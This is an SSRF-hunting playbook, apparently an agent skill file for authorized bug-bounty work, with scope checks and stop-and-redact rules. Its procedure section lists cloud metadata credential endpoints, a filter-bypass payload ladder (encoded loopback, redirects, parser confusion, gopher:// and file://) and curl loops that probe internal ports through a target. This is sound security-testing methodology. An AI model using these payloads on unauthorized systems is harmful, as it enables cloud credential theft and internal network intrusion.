---
name: zp-ssrf
description: ZeroProtocol hunter for server-side request forgery, including blind SSRF, cloud metadata access, filter bypass and protocol smuggling. Use when a parameter accepts a URL, hostname or IP, when testing webhooks, importers, PDF or screenshot renderers, avatar-by-URL, link previews, or any "fetch this for me" feature, or when checking whether an SSRF reaches internal services. Requires an out-of-band collector you control, and stops at proof of internal reach rather than pivoting.
---

# zp-ssrf - making the server fetch for you

**Phase:** 5 | **Gate:** **active.** `zp-scope check <target>` must exit 0. Exit 1 refuse ·
3 stop · 4 stop.

SSRF is the class where the blast radius most easily exceeds the authorization. The target's
internal network is *not* in your scope file. Prove the server makes a request you control,
prove it reaches something internal, and **stop** - do not explore the internal estate, do not
pivot, do not read internal service data beyond the one response that demonstrates reach.

---

## Procedure

**1. Set up a collector you control.** Without it, blind SSRF is untestable and you will waste
the whole session guessing. See `zp-toolchain`.

```bash
interactsh-client -v      # prints a domain; every DNS and HTTP hit appears live
```

Tag each injection point so a callback tells you which one fired:
`import-url.<collector>`, `avatar.<collector>`, `webhook.<collector>`.

**Never use a third-party request-bin for this.** The callback carries the target's internal
hostnames and IPs to a service you do not control.

**2. Find the sinks.** Anything that takes a location.

```bash
grep -oiE '[?&](url|uri|link|src|source|dest|redirect|next|target|host|domain|site|page|feed|rss|callback|webhook|image|img|avatar|file|path|document|template|proxy|fetch|load|import|preview|remote|endpoint|data)=[^&]*' \
  surface/urls.txt | sort -u
```

Feature-level sinks matter more than parameter names: webhook configuration, "import from
URL", avatar/profile-image by URL, PDF and screenshot generation, link unfurling, XML/SVG
processing, file conversion, RSS readers, health-check configuration, and any integration
that calls out.

**3. Confirm the server makes the request at all.**

```bash
C=abc123.oob.<collector>
curl -sk "https://$H/api/preview?url=http://import-url.$C/" -o /dev/null
# watch the collector. A DNS hit alone = the server resolved it.
# A full HTTP hit = the server fetched it. Note the source IP and User-Agent.
```

A **DNS-only** callback is weak evidence: it may be a scanner, a resolver, or a validation
step. Most programs require an HTTP hit or demonstrated internal reach. Note which you got.

**4. Go for internal reach - the part that makes it a finding.**

```
127.0.0.1  localhost  0.0.0.0  [::1]  127.1  2130706433 (decimal)  0x7f000001 (hex)  0177.1 (octal)
10.0.0.0/8   172.16.0.0/12   192.168.0.0/16   169.254.169.254   100.64.0.0/10 (CGNAT)
internal DNS: localhost.localdomain · kubernetes.default.svc · metadata · consul · redis · db
```

Cloud metadata endpoints - the highest-value SSRF target:

| Cloud | Endpoint | Note |
|---|---|---|
| AWS IMDSv1 | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | lists the attached **role name** only - a lead, not the proof |
| AWS IMDSv1 creds | `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` | the `AccessKeyId`/`SecretAccessKey`/`Token` JSON. **This** is the Critical proof |
| AWS IMDSv2 | `PUT /latest/api/token` + `X-aws-ec2-metadata-token-ttl-seconds: 21600` -> token, then `GET /latest/meta-data/...` + `X-aws-ec2-metadata-token: <token>` | method *and* request-header control required; usually not reachable via basic SSRF |
| GCP | `http://169.254.169.254/computeMetadata/v1/` + `Metadata-Flavor: Google` | header required |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` + `Metadata: true` | header required |
| Alibaba | `http://100.100.100.100/latest/meta-data/` | no header |
| Kubernetes | `https://kubernetes.default.svc/api/v1/namespaces` | plus the service-account token |

Do not report "temporary credentials were returned" off the bare `security-credentials/`
listing - that response is one line of role name, and a triager who opens your evidence and sees
it will downgrade or close the report. Append the role name and fetch the credentials path.

**If you retrieve cloud credentials, stop immediately.** Do not call the cloud API with them.
Redact them in your evidence, report that they were retrievable, and say you did not use them.
The retrievability is the Critical finding; using them is unauthorized access to the target's
cloud account.

**5. Bypass the filter. The ladder, in the order that works.**

```
alternate encodings   127.0.0.1 -> 2130706433 · 0x7f000001 · 0177.0.0.1 · 127.1 · [::ffff:127.0.0.1]
DNS that resolves in  127.0.0.1.nip.io · localtest.me · a record on YOUR OWN domain -> 127.0.0.1
redirect chain        your host 302s to http://169.254.169.254/  (bypasses allow-list-on-input)
credentials trick     http://expected-host@169.254.169.254/  ·  http://169.254.169.254#expected-host
case + trailing dot   HTTP://LOCALHOST/  ·  http://localhost./  ·  http://metadata.google.internal./
double URL encoding   %2568ttp / %252f
schema swap           file:// gopher:// dict:// ftp:// ldap:// jar:// netdoc:// http+unix://
parser confusion      http://expected.com:@evil.tld/  ·  http://evil.tld\@expected.com/
IPv6 forms            [::] · [0:0:0:0:0:ffff:127.0.0.1]
DNS rebinding         a name you control that alternates between a public IP and 127.0.0.1
```

**The trailing dot goes on a name, never on a literal.** It is a DNS root-label trick: `localhost.`
resolves, `169.254.169.254.nip.io` resolves, but `127.0.0.1.` is not a legal IPv4 literal -
measured here, `inet_aton('127.0.0.1.')` raises and `getaddrinfo('127.0.0.1.', 80)` returns
`Name or service not known`, so every getaddrinfo-based fetcher (Python, Go, Java, libcurl) never
leaves the box. Only WHATWG-URL parsers (browsers, `whatwg-url`, some Node fetchers) strip the
empty final label. Probe a literal-with-dot against a getaddrinfo fetcher and you get a DNS
error that reads exactly like "the filter held" - the misread this skill warns about below.

**DNS rebinding** is the answer to "it validated the IP, then fetched it" - the check and the
fetch resolve separately, and your record flips in between.

`file://` and `gopher://` change the severity class: `file:///etc/passwd` is local file read,
and `gopher://` can speak to Redis or SMTP. Test whether the scheme is even allowed before
building anything elaborate.

**6. Internal port and service discovery - bounded.** If you must show reach, show it
narrowly: one or two ports, one benign response each.

```bash
for p in 80 443 8080 6379 9200 3306 5432 2375; do
  printf '%5d ' "$p"
  curl -sk -o /dev/null -w '%{http_code} %{time_total}\n' --max-time 8 \
    "https://$H/api/preview?url=http://127.0.0.1:$p/"
done
```

Differential timing and error text distinguish open from closed even when the body is not
reflected. **Do not sweep the internal /16.** That is network reconnaissance of infrastructure
your scope does not cover.

---

## Confirm or kill

| Evidence | Verdict |
|---|---|
| full HTTP callback from the target's egress IP | **confirmed SSRF.** Severity depends on reach |
| DNS-only callback | weak. Many programs treat it as informational. Keep pushing for HTTP or internal reach |
| internal service response reflected back | **confirmed, high.** This is the version that pays |
| cloud metadata returned | **Critical.** Stop, redact, report. Do not use the credentials |
| `file:///etc/passwd` content returned | that is local file read -> also `zp-xxe-lfi`. Critical |
| timing difference on internal ports, no body | confirmed blind SSRF with port-scan capability. Medium-High |
| request comes from a CDN/proxy IP, not the app | may be a client-side fetch, not SSRF. Check the source IP |
| only your own browser fetched it | not SSRF at all. Killed |
| the parameter is validated to an allow-list and every bypass fails | killed. Record the variants you tried |
| SSRF to a public host only, no internal reach, no protocol tricks | low. Often N/A on its own - find the chain |

**The main false positive:** a link-preview feature fetching your URL *from the browser*, or a
security scanner in the target's pipeline hitting your collector hours later. Check the source
IP and the timing before claiming anything.

---

## High-value patterns

- **Webhook configuration** - the most common real SSRF, and often unauthenticated at creation time.
- **PDF and screenshot renderers** - a headless browser server-side; frequently allows `file://` and internal HTTP.
- **"Import from URL"** in any bulk-data feature.
- **Avatar/profile image by URL** - old, unloved, rarely re-reviewed.
- **Link unfurling in chat or comments** - fires automatically, so blind SSRF triggers itself.
- **XML/SVG processing** - SSRF via external entities; go to `zp-xxe-lfi` too.
- **Any admin-configurable endpoint URL** - health checks, integrations, LDAP or SMTP host fields.

Escalation order a triager values: internal HTTP reach -> internal service data -> cloud
metadata credentials -> RCE via `gopher://` to Redis. Demonstrate one step past reach and stop.

---

## Pitfalls

- **Pivoting into the internal network.** Your scope is the app, not the VPC. Prove reach, stop.
- **Using retrieved cloud credentials.** Report retrievability; using them is a breach.
- **A third-party request-bin as the collector.** Leaks the target's internals to a stranger.
- **Reporting a DNS-only hit as confirmed SSRF.** Say exactly what you observed.
- **Mistaking a client-side fetch for SSRF.** Check the source IP.
- **Scanning the internal range** to show impact. One or two ports is the proof.
- **Assuming IMDSv2 is reachable.** It needs a `PUT` and a header; basic SSRF usually cannot.
- **Sending mail or triggering real integrations** through a `gopher://` SMTP payload.
- **Forgetting the redirect bypass** when the allow-list is checked on input only.
- **Leaving a malicious webhook configured** on the target. Remove it and say so in the report.

---

## Hand off to

Confirmed -> `zp-triage`, `zp-report`. Cloud metadata -> `zp-cloud` for blast-radius reasoning
only, then report immediately. `file://` read -> `zp-xxe-lfi`. XML/SVG entry point ->
`zp-xxe-lfi`. `gopher://` to an internal datastore -> `zp-rce-ssti` for the impact analysis,
but do not execute. Header injection in the fetched URL -> `zp-smuggling`.
